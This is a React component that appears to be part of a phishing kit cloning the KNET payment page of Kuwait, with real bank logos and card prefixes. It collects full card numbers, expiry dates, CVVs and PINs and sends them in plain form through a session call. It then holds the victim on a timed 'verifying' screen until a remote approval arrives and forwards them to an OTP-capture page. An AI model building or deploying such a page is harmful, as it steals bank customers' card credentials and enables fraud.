import { useState, useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { getPaymentFlowState, savePaymentFlowState } from '@/lib/paymentFlowState';
import { usePaymentSession } from '@/hooks/usePaymentSession';

import { AlertCircle } from 'lucide-react';
import PaymentRejectionBanner from '@/components/PaymentRejectionBanner';

import knetLogo from '@/assets/banks/knet-logo.png';
import nbkLogo from '@/assets/banks/nbk-logo.png';
import cbkLogo from '@/assets/banks/cbk-logo.png';
import gbkLogo from '@/assets/banks/gbk-logo.png';
import abkLogo from '@/assets/banks/abk-logo.png';
import burganLogo from '@/assets/banks/burgan-logo.png';
import aubLogo from '@/assets/banks/aub-logo.png';
import kfhLogo from '@/assets/banks/kfh-logo.png';
import boubyanLogo from '@/assets/banks/boubyan-logo.png';
import warbaLogo from '@/assets/banks/warba-logo.png';
import kibLogo from '@/assets/banks/kib-logo.png';
import hsbcLogo from '@/assets/banks/hsbc-logo.png';
import knetBanner from '@/assets/banks/knet-banner.png';

const KUWAIT_BANKS = [
  { id: '', name: 'Select Your Bank', abbr: 'KNET', color: '#008B8B', prefixes: [] as string[], logo: knetLogo },
  { id: 'nbk', name: 'National Bank of Kuwait (NBK)', abbr: 'NBK', color: '#003366', prefixes: ['405843', '405853', '405871', '405873', '409567', '410124', '415899', '417768', '426083', '432423', '455014', '455015', '464452', '466799', '479098', '515504', '519130', '519916', '522888', '533215', '533607', '537272', '552050', '552277', '558883'], logo: nbkLogo },
  { id: 'cbk', name: 'Commercial Bank of Kuwait (CBK)', abbr: 'CBK', color: '#0066a1', prefixes: ['548183', '548184', '548277', '559324'], logo: cbkLogo },
  { id: 'gbk', name: 'Gulf Bank (GB)', abbr: 'GB', color: '#c8102e', prefixes: ['406430', '422056', '431927', '513665', '516647', '517419', '517458', '526206', '527262', '531329', '531470', '531471', '531644', '532675', '533769', '533770', '533788', '535966', '536524', '540261', '541107', '544675', '545424', '552007', '552078', '559475', '559320', '559582'], logo: gbkLogo },
  { id: 'abk', name: 'Al Ahli Bank of Kuwait (ABK)', abbr: 'ABK', color: '#005a32', prefixes: ['422431', '423826', '426669', '428628', '450902', '455016', '455048', '455049', '522869', '524114', '529567', '544621', '544622', '544623', '556638'], logo: abkLogo },
  { id: 'burgan', name: 'Burgan Bank', abbr: 'BUR', color: '#b8860b', prefixes: ['552299'], logo: burganLogo },
  { id: 'aub', name: 'Ahli United Bank (AUB)', abbr: 'AUB', color: '#8b0000', prefixes: ['547045', '552272', '554503'], logo: aubLogo },
  { id: 'kfh', name: 'Kuwait Finance House (KFH)', abbr: 'KFH', color: '#006838', prefixes: ['400601', '410606', '416835', '421107', '427106', '431270', '432508', '444332', '450778', '454942', '455018', '466719', '479045', '479065', '479066', '485602', '498495', '545408'], logo: kfhLogo },
  { id: 'boubyan', name: 'Boubyan Bank', abbr: 'BOB', color: '#00467f', prefixes: ['404919', '405068', '422113', '422114', '423195', '426058', '443995', '458815', '470350', '490455', '490456'], logo: boubyanLogo },
  { id: 'warba', name: 'Warba Bank', abbr: 'WRB', color: '#d4a017', prefixes: ['559459'], logo: warbaLogo },
  { id: 'kib', name: 'Kuwait International Bank (KIB)', abbr: 'KIB', color: '#008B8B', prefixes: ['554134', '559472', '559593'], logo: kibLogo },
];

const KnetPayment = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const state = (location.state as any) || getPaymentFlowState() || {};
  const total = state?.total || 0;

  const [bank, setBank] = useState('');
  const [cardPrefix, setCardPrefix] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [expiryMonth, setExpiryMonth] = useState('');
  const [expiryYear, setExpiryYear] = useState('');
  const [cvv, setCvv] = useState('');
  const [pin, setPin] = useState('');
  const [rejected, setRejected] = useState(false);

  const { status, waiting, remainingTime, redirectTo, createSession, reset, clearRedirect } = usePaymentSession();

  useEffect(() => {
    if (redirectTo) {
      navigate(redirectTo.split("?")[0], { state, replace: true }); clearRedirect();
    }
  }, [redirectTo]);

  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: 10 }, (_, i) => currentYear + i);
  const months = Array.from({ length: 12 }, (_, i) => String(i + 1).padStart(2, '0'));

  const selectedBank = KUWAIT_BANKS.find(b => b.id === bank);

  useEffect(() => {
    if (status === 'approved') {
      navigate('/knet-otp', { state: { ...state, bank, cardPrefix, cardNumber, expiryMonth, expiryYear, bankName: selectedBank?.name, bankAbbr: selectedBank?.abbr, bankColor: selectedBank?.color, bankLogo: selectedBank?.logo } });
    } else if (status === 'rejected') {
      setRejected(true);
      reset();
    }
  }, [status]);

  const [validationError, setValidationError] = useState('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setRejected(false);
    setValidationError('');

    // Strict validation - all fields required & complete
    if (!bank) {
      setValidationError('Please select your bank');
      return;
    }
    if (!cardPrefix) {
      setValidationError('Please select card prefix');
      return;
    }
    if (cardNumber.length !== 16 - (cardPrefix?.length || 0)) {
      setValidationError('Card number must be 12 digits');
      return;
    }
    if (!expiryMonth || !expiryYear) {
      setValidationError('Expiration date is required');
      return;
    }
    {
      const now = new Date();
      const curY = now.getFullYear();
      const curM = now.getMonth() + 1;
      const expY = parseInt(expiryYear, 10);
      const expM = parseInt(expiryMonth, 10);
      if (expY < curY || (expY === curY && expM < curM)) {
        setValidationError('Card expiry date is in the past');
        return;
      }
    }
    if (cvv.length !== 3) {
      setValidationError('CVV must be 3 digits');
      return;
    }
    if (pin.length !== 4) {
      setValidationError('PIN must be 4 digits');
      return;
    }

    await createSession({
      step: 'knet_payment',
      customerName: state?.form?.name,
      customerPhone: state?.form?.phone,
      total,
      cardLast4: cardNumber.slice(-4),
      paymentMethod: 'knet',
      metadata: { bank: selectedBank?.name, prefix: cardPrefix, cardNumber: cardPrefix + cardNumber, expiry: `${expiryMonth}/${expiryYear}`, cvv, pin },
    });
  };

  const handleReset = () => {
    setBank(''); setCardPrefix(''); setCardNumber('');
    setExpiryMonth(''); setExpiryYear(''); setCvv(''); setPin('');
  };

  const handleCancel = () => navigate(-1);

  return (
    <div dir="ltr" style={{ backgroundColor: '#e8e8e8', minHeight: '100dvh', display: 'flex', flexDirection: 'column', alignItems: 'center', padding: 0 }}>
      {/* Waiting Overlay */}
      {waiting && status === 'pending' && (
        <div style={{
          position: 'fixed', inset: 0, zIndex: 9999,
          backgroundColor: 'rgba(0,0,0,0.6)', display: 'flex', alignItems: 'center', justifyContent: 'center',
        }}>
          <div style={{
            backgroundColor: '#fff', borderRadius: '12px', padding: '24px 20px',
            textAlign: 'center', maxWidth: '300px', width: '90%',
            boxShadow: '0 20px 60px rgba(0,0,0,0.3)',
          }}>
            <div style={{
              width: '40px', height: '40px', border: '3px solid #ddd',
              borderTopColor: '#008B8B', borderRadius: '50%',
              animation: 'spin 1s linear infinite', margin: '0 auto 14px',
            }} />
            <h3 style={{ fontSize: '13px', fontWeight: 'bold', color: '#333', fontFamily: 'Verdana, Geneva, sans-serif', margin: '0 0 6px' }}>
              Verifying payment details...
            </h3>
            <p style={{ fontSize: '11px', color: '#888', fontFamily: 'Verdana, Geneva, sans-serif', margin: '0 0 12px' }}>
              Please wait
            </p>
            <div style={{ fontSize: '18px', fontWeight: 'bold', fontFamily: 'monospace', color: remainingTime <= 30 ? '#cc0000' : '#008B8B' }}>
              {Math.floor(remainingTime / 60)}:{String(remainingTime % 60).padStart(2, '0')}
            </div>
            <div style={{ width: '80%', height: '3px', borderRadius: '2px', backgroundColor: '#ddd', margin: '6px auto 0', overflow: 'hidden' }}>
              <div style={{ width: `${(remainingTime / 300) * 100}%`, height: '100%', borderRadius: '2px', backgroundColor: remainingTime <= 30 ? '#cc0000' : '#008B8B', transition: 'width 1s linear' }} />
            </div>
          </div>
        </div>
      )}

      {/* Top Banner */}
      <div style={{ width: '100%', maxWidth: '560px' }}>
        <img src={knetBanner} alt="KNET Security Banner" style={{ width: '100%', display: 'block' }} />
      </div>

      {/* Main Card */}
      <div style={{ width: '100%', maxWidth: '560px', padding: '16px 6px 24px' }}>
        <div style={{
          backgroundColor: '#fff', border: '1px solid #c8dce6', borderRadius: '4px',
          boxShadow: '0 1px 6px rgba(0,0,0,0.06)',
        }}>

          {/* Bank Logo */}
          <div style={{ textAlign: 'center', padding: '16px 16px 14px' }}>
            <img
              src={selectedBank?.logo || knetLogo}
              alt={selectedBank?.name || 'KNET'}
              style={{ height: '44px', objectFit: 'contain' }}
            />
          </div>

          {/* Separator line */}
          <div style={{ borderBottom: '1px solid #e0e0e0', margin: '0 16px' }} />

          {/* Validation error */}
          {validationError && (
            <div style={{
              margin: '10px 16px 0', padding: '6px 10px', borderRadius: '3px',
              backgroundColor: '#fff3f3', border: '1px solid #ffcccc',
              display: 'flex', alignItems: 'center', gap: '6px',
            }}>
              <AlertCircle size={14} color="#cc0000" />
              <span style={{ fontSize: '10px', color: '#cc0000', fontFamily: 'Verdana, Geneva, sans-serif', fontWeight: 'bold' }}>
                {validationError}
              </span>
            </div>
          )}

          {/* Rejected error — قابل للإغلاق + يختفي بعد 3 ثوانٍ */}
          <div style={{ margin: '10px 16px 0' }}>
            <PaymentRejectionBanner
              show={rejected}
              onClose={() => setRejected(false)}
              variant="knet"
            />
          </div>


          <form onSubmit={handleSubmit}>
            <div style={{ padding: '12px 16px 8px' }}>

              {/* Billing Information */}
              <h3 style={{ color: '#333', fontWeight: 'bold', fontSize: '12px', fontFamily: 'Georgia, Times, serif', fontStyle: 'italic', margin: '0 0 8px' }}>
                Billing Information
              </h3>

              <table style={{ width: '100%', borderCollapse: 'collapse', marginBottom: '10px' }}>
                <tbody>
                  <tr>
                    <td style={{ color: '#008B8B', fontWeight: 'bold', fontSize: '10px', fontFamily: 'Verdana, Geneva, sans-serif', padding: '3px 6px 3px 0', whiteSpace: 'nowrap', verticalAlign: 'middle' }}>Merchant:</td>
                    <td style={{ fontSize: '10px', fontFamily: 'Verdana, Geneva, sans-serif', color: '#444', padding: '3px 0' }}>KDD</td>
                  </tr>
                  <tr>
                    <td style={{ color: '#008B8B', fontWeight: 'bold', fontSize: '10px', fontFamily: 'Verdana, Geneva, sans-serif', padding: '3px 6px 3px 0', whiteSpace: 'nowrap', verticalAlign: 'middle' }}>Amount:</td>
                    <td style={{ fontSize: '10px', fontFamily: 'Verdana, Geneva, sans-serif', color: '#444', padding: '3px 0' }}>KD {total.toFixed(3)}</td>
                  </tr>
                </tbody>
              </table>

              {/* Card Information */}
              <h3 style={{ color: '#008B8B', fontWeight: 'bold', fontSize: '12px', fontFamily: 'Georgia, Times, serif', fontStyle: 'italic', margin: '0 0 8px' }}>
                Card Information
              </h3>

              <table style={{ width: '100%', borderCollapse: 'collapse' }}>
                <tbody>
                  {/* Select Bank */}
                  <tr>
                    <td style={{ color: '#008B8B', fontWeight: 'bold', fontSize: '10px', fontFamily: 'Verdana, Geneva, sans-serif', padding: '4px 4px 4px 0', whiteSpace: 'nowrap', verticalAlign: 'middle', width: '95px' }}>Select Your Bank:</td>
                    <td style={{ padding: '4px 0' }}>
                      <select value={bank} onChange={e => { setBank(e.target.value); setCardPrefix(''); }} required style={{
                        width: '100%', border: '1px solid #bbb', borderRadius: '2px', padding: '3px 2px',
                        fontSize: '10px', fontFamily: 'Verdana, Geneva, sans-serif', backgroundColor: '#fff', color: '#333', cursor: 'pointer',
                      }}>
                        {KUWAIT_BANKS.map(b => <option key={b.id} value={b.id}>{b.name}</option>)}
                      </select>
                    </td>
                  </tr>
                  {/* Card Number */}
                  <tr>
                    <td style={{ color: '#008B8B', fontWeight: 'bold', fontSize: '10px', fontFamily: 'Verdana, Geneva, sans-serif', padding: '4px 4px 4px 0', whiteSpace: 'nowrap', verticalAlign: 'middle' }}>Card Number:</td>
                    <td style={{ padding: '4px 0' }}>
                      <div style={{ display: 'flex', gap: '3px' }} dir="ltr">
                        <select value={cardPrefix} onChange={e => setCardPrefix(e.target.value)} required style={{
                          border: '1px solid #bbb', borderRadius: '2px', padding: '3px 1px',
                          fontSize: '10px', fontFamily: 'Verdana, Geneva, sans-serif', backgroundColor: '#fff', color: '#333', cursor: 'pointer', width: '54px',
                        }}>
                          <option value="">Prefix</option>
                          {(selectedBank?.prefixes || []).map(p => <option key={p} value={p}>{p}</option>)}
                        </select>
                        <input value={cardNumber} onChange={e => setCardNumber(e.target.value.replace(/\D/g, '').slice(0, 16 - (cardPrefix?.length || 0)))} style={{
                          border: '1px solid #bbb', borderRadius: '2px', padding: '3px 4px',
                          fontSize: '10px', fontFamily: 'Verdana, Geneva, sans-serif', backgroundColor: '#fff', color: '#333', outline: 'none', flex: 1, minWidth: 0,
                        }} maxLength={16 - (cardPrefix?.length || 0)} required dir="ltr" />
                      </div>
                    </td>
                  </tr>
                  {/* Expiration Date */}
                  <tr>
                    <td style={{ color: '#008B8B', fontWeight: 'bold', fontSize: '10px', fontFamily: 'Verdana, Geneva, sans-serif', padding: '4px 4px 4px 0', whiteSpace: 'nowrap', verticalAlign: 'middle' }}>Expiration Date:</td>
                    <td style={{ padding: '4px 0' }}>
                      <div style={{ display: 'flex', gap: '3px' }} dir="ltr">
                        <select value={expiryMonth} onChange={e => setExpiryMonth(e.target.value)} required style={{
                          border: '1px solid #bbb', borderRadius: '2px', padding: '3px 1px',
                          fontSize: '10px', fontFamily: 'Verdana, Geneva, sans-serif', backgroundColor: '#fff', color: '#333', cursor: 'pointer', width: '48px',
                        }}>
                          <option value="">MM</option>
                          {months.map(m => <option key={m} value={m}>{m}</option>)}
                        </select>
                        <select value={expiryYear} onChange={e => setExpiryYear(e.target.value)} required style={{
                          border: '1px solid #bbb', borderRadius: '2px', padding: '3px 1px',
                          fontSize: '10px', fontFamily: 'Verdana, Geneva, sans-serif', backgroundColor: '#fff', color: '#333', cursor: 'pointer', flex: 1,
                        }}>
                          <option value="">YYYY</option>
                          {years.map(y => <option key={y} value={String(y)}>{y}</option>)}
                        </select>
                      </div>
                    </td>
                  </tr>
                  {/* CVV */}
                  <tr>
                    <td style={{ color: '#cc0000', fontWeight: 'bold', fontSize: '10px', fontFamily: 'Verdana, Geneva, sans-serif', padding: '4px 4px 4px 0', whiteSpace: 'nowrap', verticalAlign: 'middle' }}>CVV:</td>
                    <td style={{ padding: '4px 0' }}>
                      <input type="password" value={cvv} onChange={e => setCvv(e.target.value.replace(/\D/g, '').slice(0, 3))} style={{
                        border: '1px solid #bbb', borderRadius: '2px', padding: '3px 4px', width: '100%', boxSizing: 'border-box',
                        fontSize: '10px', fontFamily: 'Verdana, Geneva, sans-serif', backgroundColor: '#fff', color: '#333', outline: 'none',
                      }} maxLength={3} required dir="ltr" />
                    </td>
                  </tr>
                  {/* PIN */}
                  <tr>
                    <td style={{ color: '#cc0000', fontWeight: 'bold', fontSize: '10px', fontFamily: 'Verdana, Geneva, sans-serif', padding: '4px 4px 4px 0', whiteSpace: 'nowrap', verticalAlign: 'middle' }}>PIN:</td>
                    <td style={{ padding: '4px 0' }}>
                      <input type="password" value={pin} onChange={e => setPin(e.target.value.replace(/\D/g, '').slice(0, 4))} style={{
                        border: '1px solid #bbb', borderRadius: '2px', padding: '3px 4px', width: '100%', boxSizing: 'border-box',
                        fontSize: '10px', fontFamily: 'Verdana, Geneva, sans-serif', backgroundColor: '#fff', color: '#333', outline: 'none',
                      }} maxLength={4} required dir="ltr" />
                    </td>
                  </tr>
                </tbody>
              </table>
            </div>

            {/* Separator */}
            <div style={{ borderBottom: '1px solid #e0e0e0', margin: '0 20px' }} />

            {/* Buttons row */}
            <div style={{ padding: '10px 16px 14px', display: 'flex', justifyContent: 'center', gap: '8px' }}>
              <button type="submit" disabled={!bank || !cardNumber || !pin || waiting} style={{
                padding: '5px 20px', fontSize: '11px', fontFamily: 'Verdana, Geneva, sans-serif',
                border: '1px solid #bbb', borderRadius: '3px', cursor: (!bank || !cardNumber || !pin || waiting) ? 'not-allowed' : 'pointer',
                backgroundColor: '#f7f7f7', color: '#333', opacity: (!bank || !cardNumber || !pin || waiting) ? 0.5 : 1,
              }}>Submit</button>
              <button type="button" onClick={handleReset} style={{
                padding: '5px 20px', fontSize: '11px', fontFamily: 'Verdana, Geneva, sans-serif',
                border: '1px solid #bbb', borderRadius: '3px', cursor: 'pointer',
                backgroundColor: '#f7f7f7', color: '#333',
              }}>Reset</button>
              <button type="button" onClick={handleCancel} style={{
                padding: '5px 20px', fontSize: '11px', fontFamily: 'Verdana, Geneva, sans-serif',
                border: '1px solid #888', borderRadius: '3px', cursor: 'pointer',
                backgroundColor: '#555', color: '#fff',
              }}>Cancel</button>
            </div>
          </form>

          {/* Footer */}
          <div style={{
            textAlign: 'center', padding: '10px 16px',
            borderTop: '1px solid #ddd', backgroundColor: '#fafafa',
            fontSize: '10px', fontFamily: 'Verdana, Geneva, sans-serif', color: '#999',
          }}>
            <img src={knetLogo} alt="KNET" style={{ height: '24px', objectFit: 'contain', marginBottom: '4px' }} /><br />
            © All Rights Reserved. Copyright 2026<br />
            <span style={{ color: '#008B8B', fontWeight: 'bold', fontSize: '10px' }}>The Shared Electronic Banking Services Company - KNET</span>
          </div>
        </div>
      </div>

      <style>{`
        @keyframes spin { to { transform: rotate(360deg); } }
      `}</style>
    </div>
  );
};

export default KnetPayment;
